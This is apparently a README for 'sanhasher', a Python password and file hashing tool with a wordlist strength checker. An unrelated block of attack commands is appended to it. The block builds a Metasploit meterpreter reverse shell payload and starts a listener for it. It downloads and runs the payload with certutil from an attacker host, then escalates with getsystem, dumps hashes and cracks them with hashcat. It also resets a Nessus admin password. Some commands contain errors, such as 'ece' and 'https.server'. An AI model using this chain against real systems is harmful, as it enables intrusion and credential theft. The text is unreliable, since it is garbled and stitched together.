# sanhasher
This Tool will generate a live hash of your Password/Text, and will generate a hashes of your Files, and verify the password or text can be easily cracked by verifying it in the dictionary of wordlists.......
Menu:
1. Password Hash Generator
2. File Hash Generator
3. Password Hash Checker
99. Exit

This project demonstrates:
- Password/text hashing
- File integrity hashing
- Dictionary-based password strength checking

How to use:
- command: python3 sanhasher.py

Use your wordlists to crack or use a sample wordlist to do sample checking.....

Educational & offline use only.

"C:\Program Files\Tenable\Nessus\nessuscli.exe" lsuser

sudo /opt/nessus/sbin/nessuscli lsuser

"C:\Program Files\Tenable\Nessus\nessuscli.exe" chpasswd admin

Shift + F10
start ms-cxh:localonly

msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.2.15 LPORT=4444 -f ece -o payload.exe

python3 -m https.server 8080

msfconsole

use exploit/multi/handler

set payload windows/x64/meterpreter/reverse_tcp

set LHOST 10.0.2.15

set LPORT 4444

run

certutil -urlcache -split -f https://10.0.2.15:8080/payload.exe payload.exe

payload.exe

getsystem

hashdump

echo "" > victim.txt

hashcat -m 1000 -a 0 victim.txt /usr/share/wordlists/rockyou.txt

hashcat -m 1000 -a 0 victim.txt --show 


